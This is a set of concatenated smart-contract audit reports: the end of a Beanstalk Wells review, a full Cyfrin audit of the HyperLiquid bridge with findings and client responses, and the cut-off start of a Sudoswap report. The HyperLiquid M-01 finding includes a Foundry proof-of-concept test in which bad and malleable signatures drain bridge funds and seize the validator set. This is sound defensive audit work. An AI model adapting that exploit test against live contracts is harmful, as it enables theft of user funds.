        reserves[i-1] = i;
    }

    // Log the last reserve before the store, perhaps from other implementations which don't always act on the entire reserves length
    uint256 t;
    assembly {
        t := shr(128, shl(128, sload(add(slot, mul(maxI, 32)))))
    }
    emit log_named_uint("final slot, lower 128 bits before", t);

    // Store reserves
    LibBytes.storeUint128(RESERVES_STORAGE_SLOT, reserves);

    // Re-read reserves and compare
    uint[] memory reserves2 = LibBytes.readUint128(RESERVES_STORAGE_SLOT, NUM_RESERVES_MAX);

    emit log_named_array("reserves", reserves);
    emit log_named_array("reserves2", reserves2);

    // But wait, what about the last reserve
    assembly {
        t := shr(128, shl(128, sload(add(slot, mul(maxI, 32)))))
    }

    // Turns out it was overwritten by the last store as it calculates the sload incorrectly
    emit log_named_uint("final slot, lower 128 bits after", t);
}
```

![Output before mitigation](Screenshot_2023-02-13_at_17.06.46.jpg)

### Impact

Given that assets are not directly at risk, we evaluate the severity to LOW.

### Recommended Mitigation

Implement the following fix to load the existing value from storage and pack in the lower bits:

```solidity
	sload(add(slot, mul(maxI, 32)))
```

![Output after mitigation](Screenshot_2023-02-13_at_17.07.07.jpg)

# QA

## [NC-01] Non-standard storage packing

Per the [Solidity docs](https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html), the first item in a packed storage slot is stored lower-order aligned; however, [manual packing](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/libraries/LibBytes.sol#L32) in `LibBytes` does not follow this convention. Modify the `storeUint128` function to store the first packed value at the lower-order aligned position.

## [NC-02] EIP-1967 second pre-image best practice
When calculating custom [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967) storage slots, as in [Well.sol::RESERVES_STORAGE_SLOT](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/Well.sol#L37), it is [best practice](https://ethereum-magicians.org/t/eip-1967-standard-proxy-storage-slots/3185?u=frangio) to add an offset of `-1` to the hashed value to further reduce the possibility of a second pre-image attack.

## [NC-03] Remove experimental ABIEncoderV2 pragma
ABIEncoderV2 is enabled by default in Solidity 0.8, so [two](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/interfaces/IWellFunction.sol#L6) [instances](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/interfaces/IPump.sol#L6) can be removed.

## [NC-04] Inconsistent use of decimal/hex notation in inline assembly
For readability and to prevent errors when working with inline assembly, decimal notation should be used for integer constants and hex notation for memory offsets.

## [NC-05] Unused variables, imports and errors
In `LibBytes`, the [`temp` variable]((https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/libraries/LibBytes.sol#L39)) of `storeUint128` is unused and should be removed.

In `LibMath`:
- OpenZeppelin SafeMath is imported but not used
- `PRBMath_MulDiv_Overflow` error is declared but never used

## [NC-06] Inconsistency in LibMath comments
There is inconsistent use of `x` in comments and `a` in code within the `nthRoot` and `sqrt` [functions](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/libraries/LibMath.sol#L44-L147) of `LibMath`.

## [NC-07] FIXME and TODO comments
There are several [FIXME](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/interfaces/IWell.sol#L268) and [TODO](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/libraries/LibMath.sol#L36) comments that should be addressed.

## [NC-08] Use correct NatSpec tags
Uses of `@dev See {IWell.fn}` should be replaced with `@inheritdoc IWell` to inherit the NatSpec documentation from the interface.

## [NC-09] Format for readability
For readability, code should be formatted according to the [Solidity Style Guide](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#other-recommendations) which includes surrounding operators with a single space on either side: e.g. [`numberOfBytes0 - 1`](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/utils/ImmutablePumps.sol#L220).

## [NC-10] Spelling errors
The following spelling errors were identified:
- ['configurating'](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/interfaces/IWell.sol#L110) should become 'configuration'
- ['Pump'/'_pumo'](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/Well.sol#L43) should become 'Pumps'/'_pumps'

## [G-1] Simplify modulo operations
In `LibBytes::storeUint128` and `LibBytes::readUint128`, `reserves.lenth % 2 == 1` and `i % 2 == 1` can be simplified to `reserves.length & 1 == 1` and `i & 1 == 1`.

## [G-2] Branchless optimization
The `sqrt` function in `MathLib` and [related comment](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/libraries/LibMath.sol#L136-L145) should be updated to reflect changes in Solmate's `FixedPointMathLib` which now includes the [branchless optimization](https://github.com/transmissions11/solmate/blob/1b3adf677e7e383cc684b5d5bd441da86bf4bf1c/src/utils/FixedPointMathLib.sol#L220-L225) `z := sub(z, lt(div(x, z), z))`.


------ FILE END car/reports_md/2023-03-13-beanstalk_wells_v0.1.md ------


------ FILE START car/reports_md/2023-04-11-cyfrin-hyperliquid-dex-report.md ------

---
title: Cyfrin Hyperliquid Audit Report
author: Cyfrin.io
date: April 11, 2023
linkcolor: blue
urlcolor: blue
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf}
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries HyperLiquid Audit Report\par}
    \vspace{1cm}
    {\Large Version 2.1\par}
    \vspace{2cm}
    {\Large\itshape Cyfrin.io\par}
    \vfill
    {\large April 11, 2023\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: [Cyfrin](https://cyfrin.io)

Lead Auditors:

- [Giovanni Di Siena](https://twitter.com/giovannidisiena)

- [Hans](https://twitter.com/hansfriese)

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Disclaimer](#disclaimer)
- [Protocol Summary](#protocol-summary)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Severity Criteria](#severity-criteria)
  - [Summary of Findings](#summary-of-findings)
- [Medium Findings](#medium-findings)
  - [\[M-01\] Bad signature validation, malleability \& lack of zero address protection in `updateValidatorSet`](#m-01-bad-signature-validation-malleability--lack-of-zero-address-protection-in-updatevalidatorset)
    - [Description](#description)
    - [Proof of Concept](#proof-of-concept)
    - [Impact](#impact)
    - [Recommended Mitigation](#recommended-mitigation)
    - [`f045dbf` Resolution](#f045dbf-resolution)
  - [\[M-02\] Incorrect initialization of `powerThreshold` and lack of validation](#m-02-incorrect-initialization-of-powerthreshold-and-lack-of-validation)
    - [Description](#description-1)
    - [Impact](#impact-1)
    - [Recommended Mitigation](#recommended-mitigation-1)
    - [`f045dbf` Resolution](#f045dbf-resolution-1)
- [Low Findings](#low-findings)
  - [\[L-01\] Prevent setting the new epoch to an arbitrary large value](#l-01-prevent-setting-the-new-epoch-to-an-arbitrary-large-value)
    - [Description](#description-2)
    - [Impact](#impact-2)
    - [Recommended Mitigation](#recommended-mitigation-2)
    - [`f045dbf` Resolution](#f045dbf-resolution-2)
- [Informational/Non-Critical Findings](#informationalnon-critical-findings)
  - [\[NC-01\] Make `minTotalValidatorPower` immutable](#nc-01-make-mintotalvalidatorpower-immutable)
    - [`f045dbf` Resolution](#f045dbf-resolution-3)
  - [\[NC-02\] Avoid using an initializer unless absolutely necessary](#nc-02-avoid-using-an-initializer-unless-absolutely-necessary)
    - [`f045dbf` Resolution](#f045dbf-resolution-4)
  - [\[NC-03\] Use calldata for all function arguments that are not modified](#nc-03-use-calldata-for-all-function-arguments-that-are-not-modified)
    - [`f045dbf` Resolution](#f045dbf-resolution-5)
  - [\[NC-04\] `updateValidatorSet` block scope is not necessary](#nc-04-updatevalidatorset-block-scope-is-not-necessary)
    - [`f045dbf` Resolution](#f045dbf-resolution-6)
  - [\[NC-05\] Emit events before interaction](#nc-05-emit-events-before-interaction)
    - [`f045dbf` Resolution](#f045dbf-resolution-7)
  - [\[NC-06\] Make USDC amount naming more verbose](#nc-06-make-usdc-amount-naming-more-verbose)
    - [`f045dbf` Resolution](#f045dbf-resolution-8)
  - [\[NC-07\] Rename file to `Bridge2.sol` to match the contract name](#nc-07-rename-file-to-bridge2sol-to-match-the-contract-name)
    - [`f045dbf` Resolution](#f045dbf-resolution-9)
  - [\[NC-08\] Add missing NatSpec comments to document function parameters and behaviour](#nc-08-add-missing-natspec-comments-to-document-function-parameters-and-behaviour)
    - [`f045dbf` Resolution](#f045dbf-resolution-10)
  - [\[NC-09\] No need to explicitly initialize variables to 0](#nc-09-no-need-to-explicitly-initialize-variables-to-0)
    - [`f045dbf` Resolution](#f045dbf-resolution-11)
  - [\[NC-10\] Use addition assignment operator](#nc-10-use-addition-assignment-operator)
    - [`f045dbf` Resolution](#f045dbf-resolution-12)
  - [\[NC-11\] Localhost chain id can be 1337 or 31337](#nc-11-localhost-chain-id-can-be-1337-or-31337)
    - [`f045dbf` Resolution](#f045dbf-resolution-13)
  - [\[NC-12\] Rename to DOMAIN\_SEPARATOR and use `block.chainId` directly](#nc-12-rename-to-domain_separator-and-use-blockchainid-directly)
    - [`f045dbf` Resolution](#f045dbf-resolution-14)
  - [\[NC-13\] Rename to `EIP712_DOMAIN_TYPEHASH`](#nc-13-rename-to-eip712_domain_typehash)
    - [`f045dbf` Resolution](#f045dbf-resolution-15)
  - [\[NC-14\] Include `byte32 salt` in domain typehash](#nc-14-include-byte32-salt-in-domain-typehash)
    - [`f045dbf` Resolution](#f045dbf-resolution-16)
  - [\[NC-15\] Verifying contract TODO](#nc-15-verifying-contract-todo)
    - [`f045dbf` Resolution](#f045dbf-resolution-17)

# Disclaimer

The Cyfrin team makes every effort to find as many vulnerabilities in the code as possible in the given time but holds no responsibility for the findings in this document. A security audit by the team does not endorse the underlying business or product. The audit was time-boxed to one week, and the review of the code was solely on the security aspects of the solidity implementation of the contracts.

# Protocol Summary
The HyperLiquid bridge contract runs on Arbitrum, operating alongside the HyperLiquid L1 which runs tendermint consensus. Validator set updates happen at the end of each epoch, the duration of which still TBD, but likely somewhere between 1 day and 1 week. The contracts currently only support USDC, though the logic extends to support deposits/withdrawals of any other ERC20 token on Arbitrum.

# Audit Details

## Scope

Between March 16th 2023 - March 20th 2023, the Cyfrin team conducted an audit on the HyperLiquid `Bridge.sol` and `Signature.sol` contracts.

Commit hash: `e0aff46` of [hyperliquid-dex/contracts](https://github.com/hyperliquid-dex/contracts).

Out of scope
The test file `example.rs` in the tests directory.

## Severity Criteria

- High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).

- Medium: Assets not at immediate risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions but external requirements.

- Low: Low impact and low/medium likelihood events where assets are not at risk (or a trivia amount of assets are), state handling might be off, functions are incorrect regarding NatSpec, issues with comments, etc. 

- Informational / Non-Critial: A non-security issue, like a suggested code improvement, a comment, a renamed variable, etc. Auditors did not attempt to find an exhaustive list of these.

- Gas: Gas saving/performance suggestions. Auditors did not attempt to find an exhaustive list of these.

## Summary of Findings

| Finding                                                                                        | Severity | Status   |
| :--------------------------------------------------------------------------------------------- | :------- | :------- |
| [\[M-01\] Bad signature validation, malleability & lack of zero address protection in `updateValidatorSet`](#m-01-bad-signature-validation,-malleability-&-lack-of-zero-address-protection-in-`updateValidatorSet`)      | M | Resolved |
| [\[M-02\] Incorrect initialization of `powerThreshold` and lack of validation](#m-02-incorrect-initialization-of-`powerThreshold`-and-lack-of-validation)                                                                | M | Resolved |
| [\[L-01\] Prevent setting the new epoch to an arbitrary large value](#l-01-prevent-setting-the-new-epoch-to-an-arbitrary-large-value)                                                                                    | L | Ack      |
| [\[NC-01\] Make `minTotalValidatorPower` immutable](#nc-01-make-`minTotalValidatorPower`-immutable)                                                                                                                      | I | Resolved |
| [\[NC-02\] Avoid using an initializer unless absolutely necessary](#nc-02-avoid-using-an-initializer-unless-absolutely-necessary)                                                                                        | I | Resolved |
| [\[NC-03\] Use calldata for all function arguments that are not modified](#nc-03-use-calldata-for-all-function-arguments-that-are-not-modified)                                                                          | I | Ack      |
| [\[NC-04\] `updateValidatorSet` block scope is not necessary](#nc-04-`updateValidatorSet`-block-scope-is-not-necessary)                                                                                                  | I | Resolved |
| [\[NC-05\] Emit events before interaction](#nc-05-emit-events-before-interaction)                                                                                                                                        | I | Resolved |
| [\[NC-06\] Make USDC amount naming more verbose](#nc-06-make-usdc-amount-naming-more-verbose)                                                                                                                            | I | Ack      |
| [\[NC-07\] Rename file to `Bridge2.sol` to match the contract name](#nc-07-rename-file-to-`Bridge2.sol`-to-match-the-contract-name)                                                                                      | I | Resolved |
| [\[NC-08\] Add missing NatSpec comments to document function parameters and behaviour](#nc-08-add-missing-natspec-comments-to-document-function-parameters-and-behaviour)                                                | I | Ack      |
| [\[NC-09\] No need to explicitly initialize variables to 0](#nc-09-no-need-to-explicitly-initialize-variables-to-0)                                                                                                      | I | Resolved |
| [\[NC-10\] Use addition assignment operator](#nc-10-use-addition-assignment-operator)                                                                                                                                    | I | Resolved |
| [\[NC-11\] Localhost chain id can be 1337 or 31337](#nc-11-localhost-chain-id-can-be-1337-or-31337)                                                                                                                      | I | Resolved |
| [\[NC-12\] Rename to DOMAIN_SEPARATOR and use `block.chainId` directly](#nc-12-rename-to-domain_separator-and-use-`block.chainId`-directly)                                                                              | I | Resolved |
| [\[NC-13\] Rename to `EIP712_DOMAIN_TYPEHASH`](#nc-13-rename-to-`eip712_domain_typehash`)                                                                                                                                | I | Resolved |
| [\[NC-14\] Include `byte32 salt` in domain typehash](#nc-14-include-`byte32-salt`-in-domain-typehash)                                                                                                                    | I | Ack      |
| [\[NC-15\] Verifying contract TODO](#nc-15-verifying-contract-todo)                                                                                                                                                      | I | Ack      |

# Medium Findings

## [M-01] Bad signature validation, malleability & lack of zero address protection in `updateValidatorSet`

### Description

The `ecrecover` built-in will return `address(0)` if it fails to recover the signer from a message digest and corresponding signature. There is no `address(0)` check in [`Signature::recoverSigner`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L62) or [`Bridge::checkValidatorSignatures`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L154).

Anyone can submit bad signatures to steal bridge funds, calling `Bridge::withdraw`, or take over the bridge as a solitary validator, calling `Bridge::updateValidatorSet` if the validator set is initialized or updated to be a zero address validator set with threshold power. This is of course highly unlikely as it would not be within the validators' best interest; however, it is still possible and should be mitigated so long as bas signer recovery is an issue.

Additionally, it is possible to call `Bridge::withdraw` and `Bridge::updateValidatorSet` using malleable validator signatures. Due to the nature of elliptic curves, it is possible to modify a signature to create another unique signature which recovers to the same signer address. Fortunately, the `Bridge::processedWithdrawals` mapping and validator (epoch) checkpoints protect against replay. Along with bad signer recovery, this should be mitigated using the [OpenZeppelin ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol).

### Proof of Concept

The following forge test can be seen to demonstrate these findings:

```solidity
function test_signatureMalleabilityAndBadValidation() public {
    address sender = makeAddr("alice");
    address pwner = makeAddr("pwner");
    uint256 amount = 1e5;
    uint256 nonce = 0;
    ValidatorSet memory validatorSet = ValidatorSet(0, s_validators,s_powers);
    Signature[] memory sigs = _getSignatures(sender, amount, nonce);
    Signature[] memory sigsCache = sigs;
    for (uint256 i = 0; i < sigs.length; ++i) {
        sigs[i].s =
            uint256(115792089237316195423570985008687907852837564279074904382605163141518161494337) - sigs[i].s;
        sigs[i].v = sigs[i].v == 27 ? 28 : 27;
    }
    console.log("withdrawing with malleable signatures");
    vm.startPrank(sender);
    bridge.withdraw(amount, nonce, validatorSet, validatorSet.validators,sigs);
    console.log(
        "fortunately, the `processedWithdrawals` mapping and validator(epoch) checkpoints protect against replay"
    );
    vm.expectRevert("Already withdrawn");
    bridge.withdraw(amount, nonce, validatorSet, validatorSet.validators,sigsCache);
    ValidatorSet memory newValidatorSet = ValidatorSet(1, s_newValidators,s_newPowers);
    vm.expectEmit(true, false, false, true);
    emit ValidatorSetUpdatedEvent(newValidatorSet.epoch, newValidatorSetvalidators, newValidatorSet.powers);
    Signature[] memory updateValidatorSigs = _getUpdateValidatorSignature(newValidatorSet, s_validatorKeys);
    bridge.updateValidatorSet(newValidatorSet, validatorSet, validatorSetvalidators, updateValidatorSigs);
    for (uint256 i = 0; i < updateValidatorSigs.length; ++i) {
        updateValidatorSigs[i].s = uint256(
            115792089237316195423570985008687907852837564279074904382605163141518161494337
        ) - updateValidatorSigs[i].s;
        updateValidatorSigs[i].v = updateValidatorSigs[i].v == 27 ? 28 : 27;
    }
    ValidatorSet memory emptyValidatorSet = ValidatorSet(2, s_zeroValidators,s_newPowers);
    bridge.updateValidatorSet(
        emptyValidatorSet, newValidatorSet, newValidatorSet.validators,_getUpdateValidatorSignatures(emptyValidatorSet, s_newValidatorKeys)
    );
    vm.expectRevert("New validator set epoch must be greater than the currentepoch");
    bridge.updateValidatorSet(newValidatorSet, emptyValidatorSet,emptyValidatorSet.validators, updateValidatorSigs);
    console.log("but what if validator set is updated to zero addressvalidator set with non-zero power?");
    address[] memory validatorArr = new address[](1);
    validatorArr[0] = PWNER;
    uint256[] memory powerArr = new uint256[](1);
    powerArr[0] = uint256(1000000);
    ValidatorSet memory pwnValidatorSet = ValidatorSet(3, validatorArr,powerArr);
    Signature[] memory emptySigs = new Signature[](3);
    emptySigs[0] = Signature(0, 0, 0);
    emptySigs[1] = Signature(0, 0, 0);
    emptySigs[2] = Signature(0, 0, 0);
    console.log("anyone can submit bad signatures to steal bridge funds");
    changePrank(pwner);
    emit log_named_uint("bridge balance before", IERC20(USDC_ADDRESS)balanceOf(address(bridge)));
    emit log_named_uint("pwner balance before", IERC20(USDC_ADDRESS).balanceO(pwner));
    bridge.withdraw(IERC20(USDC_ADDRESS).balanceOf(address(bridge)), 0,emptyValidatorSet, emptyValidatorSet.validators, emptySigs);
    emit log_named_uint("pwner balance after", IERC20(USDC_ADDRESS).balanceO(pwner));
    emit log_named_uint("bridge balance after", IERC20(USDC_ADDRESS).balanceO(address(bridge)));
    vm.expectEmit(true, false, false, true);
    emit ValidatorSetUpdatedEvent(pwnValidatorSet.epoch, pwnValidatorSetvalidators, pwnValidatorSet.powers);
    bridge.updateValidatorSet(pwnValidatorSet, emptyValidatorSet,emptyValidatorSet.validators, emptySigs);
    console.log("or take over the bridge as a solitary validator");
}

function _getUpdateValidatorSignatures(ValidatorSet memory newValidatorSet, uint256[] memory currValidatorKeys)
    internal
    view
    returns (Signature[] memory)
{
    Signature[] memory signatures = new Signature[](s_validators.length);
    bytes32 newCheckpoint =
        keccak256(abi.encode(newValidatorSet.validators, newValidatorSetpowers, newValidatorSet.epoch));
    Agent memory agent = Agent("a", newCheckpoint);
    bytes32 digest = keccak256(abi.encodePacked("\x19\x01",LOCALHOST_DOMAIN_HASH, hash(agent)));
    for (uint256 i = 0; i < s_validators.length; ++i) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(currValidatorKeys[i],digest);
        signatures[i] = Signature(uint256(r), uint256(s), v);
    }
    return signatures;
}
function _getWithdrawSignatures(address sender, uint256 amount, uint256nonce) internal view returns (Signature[] memory) {
    Signature[] memory signatures = new Signature[](s_validators.length);
    Agent memory agent = Agent("a", keccak256(abi.encode(sender, amount,nonce)));
    bytes32 digest = keccak256(abi.encodePacked("\x19\x01",LOCALHOST_DOMAIN_HASH, hash(agent)));
    for (uint256 i = 0; i < s_validators.length; ++i) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(s_validatorKeys[i], digest);
        // console.log("validator: %s", i);
        // console.log("v: %s", uint256(v));
        // console.log("r: %s", uint256(r));
        // console.log("s: %s", uint256(s));
        signatures[i] = Signature(uint256(r), uint256(s), v);
    }
    return signatures;
}
```

### Impact

Given the vulnerability described has a low likelihood but high impact, we evaluate the severity to MEDIUM.

### Recommended Mitigation

As mentioned above, it is recommended to correctly validate recovered signers and protect against signature malleability by using the [OpenZeppelin ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol). Additionally, add zero address validation to `Bridge::updateValidatorSet` to ensure it is not possible to update the validator set to a vulnerable state.

**Edit (2023-04-14):** OpenZeppelin `ECDSA` has a vulnerability in versions lower than 4.7.3, which can be exploited by an attacker. When using this library, use the latest version of @openzeppelin/contracts, or a version that is newer or at least 4.7.3.

### `f045dbf` Resolution

A zero address check has been added to `Signature.sol::recoverSigner` to address this finding. The client team states that they do not believe this is a feasible exploit since it requires 2/3 of the validators' coordination to perform the bad signature exploit, which only happens when the L1 and bridges integrity are already compromised, and that it should instead be a low/NC severity issue. The Cyfrin team maintains that this is medium severity in the scope of this audit given its limited scope and context.

## [M-02] Incorrect initialization of `powerThreshold` and lack of validation

### Description

The `Bridge::powerThreshold` should be 2/3 the sum of the validator power across current validators at any point; however, the [calculation](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L94) in `Bridge2::constructor` is not correct and it's initialized to `(2 * _minTotalValidatorPower) / 3` while it should instead be `powerThreshold = (2 * cumulativePower) / 3;`, i.e. use the return value of `checkNewValidatorPowers` as is the case in `Bridge::updateValidatorSet`.
From the fact that `cumulativePower >= minTotalValidatorPower`, it means the initialized `powerThreshold` is less than reasonable.
Furthermore, from the communication with the client team, it is understood that `minTotalValidatorPower` is only used to prevent rounding issues and set once and not changed (immutable). Hence it is likely this value is not likely to be around the actual cumulative power but a lot less than it.
Because `powerThreshold` is initialized to a fairly less value, this can allow malicious actions that are lack of validation power.

Furthermore, the protocol implements [admin functionality](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L252-L256) whereby `powerThreshold` can be set to an arbitrary value without any validation - this is not recommended and should be subject to the same validation that `powerThreshold` is at least 2/3 the sum of the total validator power and not over the sum of the total validator power.

### Impact

It is possible malicious actions that are lack of validation power are allowed due to wrong initialization of `powerThreshold`.
Because the initializer is assumed to be called by an admin and there is also another admin function to change the `powerThreshold`, we evaluate the severity to MEDIUM.

### Recommended Mitigation

- Initialize `powerThreshold` to the 2/3 the sum of the initial validator powers.
- Add validation for the new `powerThreshold` in `Bridge::changePowerThreshold()` to allow only reasonable values (ranging from 2/3 to total of the current cumulative validation power).

### `f045dbf` Resolution

The calculation now uses the `cumulativePower` returned from `checkNewValidatorPowers` to set `powerThreshold` in the constructor. The client team states that this is also low/NC severity because the initial set of validators is intended to be the team, and future validator updates are not prone to this issue. The Cyfrin team maintains that this is medium severity in the scope of this audit given its limited scope and context.

# Low Findings

## [L-01] Prevent setting the new epoch to an arbitrary large value

### Description

In the function `Bridge::updateValidatorSet`, the new epoch is [checked](https://github.com/ChainAccelOrg/hyperliquid-audit/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L213) to be greater than the current epoch. However, there is no check to prevent setting the new epoch to an arbitrary large value which can be used to freeze the protocol. If it is set to `type(uint256).max` then no more updates are possible.

### Impact

This is not likely to happen but we evaluate as LOW because it can freeze the protocol, locking funds and effectively make the whole protocol insolvent.

### Recommended Mitigation

It is recommended to allow increase of epoch only to some limited extent, rather than any arbitrary large number.

### `f045dbf` Resolution

The client team acknowledges this finding with the following comment:

> This does not seem like a useful change to us. This restricts the L1 epoch update logic without any security gains. Maliciously setting the epoch to `MAX_INT` will indeed lock the smart contract, but that means that the L1 and bridge are already compromised.

# Informational/Non-Critical Findings

## [NC-01] Make `minTotalValidatorPower` immutable

Given that `Bridge::minTotalValidatorPower` is initialized once in the constructor and never modified thereafter, it can be made immutable. This also has the effect of reducing gas usage in functions which currently read its value from storage.

### `f045dbf` Resolution

`minTotalValidatorPower` is now immutable.

## [NC-02] Avoid using an initializer unless absolutely necessary

[This comment](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L85-L86) references the potential introduction of a separate initializer but it should be noted that bad initialization is the cause of many exploits in the wild and so should be avoided wherever possible.

### `f045dbf` Resolution

The comment has been removed.

## [NC-03] Use calldata for all function arguments that are not modified

If function arguments are not intended to be modified then it is best practice to pass them as calldata arguments rather than memory, for example in [https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#LL94C48-L94C48](`Bridge::updateValidatorSet`).

### `f045dbf` Resolution

The client team acknowledges this finding with the following comment:

> Through testing we found that using memory seems to require less gas than calldata on Arbitrum, which is why we wrote everything using memory to begin with.

## [NC-04] `updateValidatorSet` block scope is not necessary

The block scope in `Bridge::updateValidatorSet` is not necessary as the contract successfully compiles without it and so can be removed.

### `f045dbf` Resolution

The block scope has been removed.

## [NC-05] Emit events before interaction

To strictly conform to checks-effect-interactions, it is recommended to emit events prior to any [external interactions](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L122-L123). This is generally advised to ensure correct migration through state reconstruction, which in this case should not be affected given `Bridge::deposit` is marked as `nonReentrant`, but it is still good practice.

### `f045dbf` Resolution

Events are now emitted before external interactions.

## [NC-06] Make USDC amount naming more verbose

The naming of the USDC amount parameter in [`Bridge::deposit and Bridge::withdraw`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L120-L152) is not clear, i.e. change `uint256 usdc` to `uin256 usdcAmount`.

### `f045dbf` Resolution

The client team acknowledges this finding with the following comment:

> Does not seem like a useful change for us. `usdc` is clear since its of type `uint256`, and we use the same convention in the l1 code and solidity event fields

## [NC-07] Rename file to `Bridge2.sol` to match the contract name

The `Bridge2` contract resides in `Bridge.sol`; however, it is best practice to follow the convention of one contract per file with the same name.

### `f045dbf` Resolution

The client team has renamed the contract to `Bridge.sol` with the following comment:

> We call it Bridge2 internally until it replaces the current bridge, at which point we will rename everything to Bridge.

## [NC-08] Add missing NatSpec comments to document function parameters and behaviour

It is recommended to document all function behaviours and parameters, especially if they are public-facing.

### `f045dbf` Resolution

The client team acknowledges this finding with the following comment:

> Light comments were added to functions in `Bridge.sol`.

## [NC-09] No need to explicitly initialize variables to 0

Variables are initalized to 0 by default in Solidity, so a [number](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L169-L170) of [superfluous](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L173) [assigments](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L236-L237) can be removed.

### `f045dbf` Resolution

Superfluous assignments have been removed.

## [NC-10] Use addition assignment operator

The addition assignment operator `+=` can be used when [checking new validator powers](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L238).

### `f045dbf` Resolution

The addition assignment operator has been used.

## [NC-11] Localhost chain id can be 1337 or 31337

The default localhost chain id for some frameworks (e.g. HardHat) is `31337` rather than `1337`. For example, it is not possible to run signature tests using forge without changing `Signature::LOCALHOST_CHAIN_ID` to `31337`.

### `f045dbf` Resolution

This has been resolved by the resolution of NC-12.

## [NC-12] Rename to DOMAIN_SEPARATOR and use `block.chainId` directly

References to `*_DOMAIN_HASH` in `Signature` should be renamed to `*_DOMAIN_SEPARATOR` to be more consistent with the EIP and avoid confusion. Additionally, it is recommended to use `block.chainId` directly, caching on contract creation and only recomputing the domain separator if the chain id changes, removing the need for multiple different separators to be defined.

### `f045dbf` Resolution

The client team has removed the domain separator contants in favour of a single `EIP712_DOMAIN_SEPARATOR` constant with the following comment in response to the Cyfrin team's comment about recomputing the domain separator if the chain id changes:

> Hard fork concern potentially just an edge case not worth thinking about.

## [NC-13] Rename to `EIP712_DOMAIN_TYPEHASH`

Add an [additional underscore](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L19) for readability.

### `f045dbf` Resolution

The constant has been renamed to `EIP712_DOMAIN_TYPEHASH`.

## [NC-14] Include `byte32 salt` in domain typehash

Per the [EIP](https://eips.ethereum.org/EIPS/eip-712), `bytes32 salt` should be added to the [domain separator](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L20) as a last-resort means to distinguish this application from others. Whilst it is unlikely that there would be signatures generated for other contracts that could be replayed onto the bridge, inclusion of a salt gives additional security assurances for little additional overhead.

### `f045dbf` Resolution

The client team acknowledges this finding with the following comment:

> We dont think this is a useful change. Since only the validators generate these signatures for the bridge, we do not need to worry about the events being replayed on other smart contracts. Also, including `byte32 salt` causes problems when generating signatures using the rust client code. 

## [NC-15] Verifying contract TODO

Update the [verifying contract address](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L25).

### `f045dbf` Resolution

The client team acknowledges this finding with the following comment:

> Removed the TODO. Keeping the verifying address as the zero address, though slightly confusing, is more convenient for us and has no significant drawbacks.


------ FILE END car/reports_md/2023-04-11-cyfrin-hyperliquid-dex-report.md ------


------ FILE START car/reports_md/2023-06-01-sudoswap-report.md ------

# Findings

## High Risk
